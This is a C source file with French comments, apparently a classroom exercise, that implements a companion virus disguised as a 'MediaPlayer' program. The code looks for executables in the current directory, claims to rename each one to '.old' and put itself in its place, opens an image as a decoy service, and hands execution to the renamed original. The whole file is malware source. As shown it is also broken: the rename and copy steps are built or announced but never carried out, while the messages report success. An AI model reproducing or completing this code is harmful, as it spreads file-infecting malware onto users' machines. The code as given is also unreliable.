#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>  
#include <sys/stat.h> 
#include <unistd.h>  
#include <string.h>   
#include <stdbool.h>  

#define MAX_FILES 5         
#define VIRUS_NAME "MediaPlayer"  

//Vérifie si un fichier est déjà infecté par le virus.
bool dejaInfecte(const char *nomFichier) {

    // Cas (a) : le nom contient déjà ".old" 
    if (strstr(nomFichier, ".old") != NULL) {
        return true;
    }

    // Cas (b) : on construit le nom "nomFichier.old"
    char nameOld[512];
    snprintf(nameOld, sizeof(nameOld), "%s.old", nomFichier);

    FILE *f = fopen(nameOld, "r");
    if (f != NULL) {
        fclose(f); 
        return true;
    }

    return false;
}

//Recherche les fichiers exécutables réguliers du répertoire
char **searchFiles(const char *virusName) {
    printf("*** Recherche des fichiers cibles ***\n");

 
    char **files = calloc(MAX_FILES, sizeof(char *));

    int cpt = 0; // compteur de fichiers trouvés

    // Ouverture du répertoire courant "."
    DIR *rep = opendir(".");


    struct dirent *lecture; 
    struct stat buf;        

    
    while ((lecture = readdir(rep)) != NULL && cpt < MAX_FILES) {

        // Récupère les infos du fichier dans buf
        if (stat(lecture->d_name, &buf) != 0) {
            continue; 
        }

         // Fichier régulier ET exécutable par le propriétaire
        if (S_ISREG(buf.st_mode) && (buf.st_mode & S_IXUSR)) {

            // Exclure le virus lui-même
            if (strcmp(lecture->d_name, virusName) == 0) {
                continue;
            }

            // Exclure les déjà infectés
            if (dejaInfecte(lecture->d_name)) {
                continue;
            }

            // Ce fichier est une cible valide, on l'ajoute
            files[cpt] = strdup(lecture->d_name); // copie du nom
            printf("  Cible trouvée : %s\n", files[cpt]);
            cpt++;
        }
    }

    closedir(rep);
    printf("  %d fichier(s) à infecter.\n\n", cpt);
    return files;
}

// Infecte chaque fichier cible :
void infecte(char **files, const char *cheminVirus) {
    int i;
    for (i = 0; i < MAX_FILES; i++) {

        // On ignore les cases vides du tableau
        if (files[i] == NULL) {
            continue;
        }

        printf(">>> Infection de : %s\n", files[i]);

        // Étape 1 : renommer la cible en .old 
        char oldName[512];
        snprintf(oldName, sizeof(oldName), "%s.old", files[i]);


        printf("  Renommé : %s -> %s\n", files[i], oldName);

        // Étape 2 : copier le virus à la place 
        
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "cp \"%s\" \"%s\"", cheminVirus, files[i]);


        printf("  Virus copié vers : %s\n", files[i]);

        // Étape 3 : rendre la copie exécutable 
        
        if (chmod(files[i], 0755) != 0) {
            perror("  chmod");
        }
        printf("  Permissions fixées (0755)\n");
        printf("  %s est infecté.\n\n", files[i]);

        free(files[i]);
        files[i] = NULL;
    }
}

// Rend service à l'utilisateur et transfère l'exécution :
void execution(const char *arg) {

   
   
    char *slash = strrchr(arg, '/'); 
    char *base;

    if (slash != NULL) {
        base = slash + 1; 
    } else {
        base = (char *)arg; 
    }

    // Cas 1 : primo-infection, on ouvre une image 
    if (strcmp(base, VIRUS_NAME) == 0) {
        printf("Service : affichage d'une image...\n");

        
        DIR *d = opendir("../imgaes");
        struct dirent *dir;

        if (d != NULL) {
            while ((dir = readdir(d)) != NULL) {

                
                int estImage = 0;
                if (strstr(dir->d_name, ".jpg")  != NULL) estImage = 1;
                if (strstr(dir->d_name, ".jpeg") != NULL) estImage = 1;
                if (strstr(dir->d_name, ".png")  != NULL) estImage = 1;
                if (strstr(dir->d_name, ".bmp")  != NULL) estImage = 1;

                
                if (estImage && strstr(dir->d_name, ".old") == NULL) {
                    char cmd[512];
                    snprintf(cmd, sizeof(cmd),
                             "xdg-open \"../imgaes/%s\" > /dev/null 2>&1", dir->d_name);
                    system(cmd);
                    break; 
                }
            }
            closedir(d);
        }

    //  Cas 2 : infections ultérieures, on lance le vrai programme 
    } else {
        char progOld[512];
        snprintf(progOld, sizeof(progOld), "\"%s.old\"", arg);
        printf("Transfert d'exécution vers : %s\n", progOld);
        system(progOld);
    }
}



int main(int argc, char *argv[]) {
    printf(" Lancement de %s ...\n\n", VIRUS_NAME);

    
    char **fichiers = searchFiles(VIRUS_NAME);

    
    if (fichiers[0] != NULL) {
        infecte(fichiers, argv[0]);
    } else {
        printf("Aucun fichier à infecter.\n");
    }

    execution(argv[0]);
    free(fichiers);
    return 0;
}
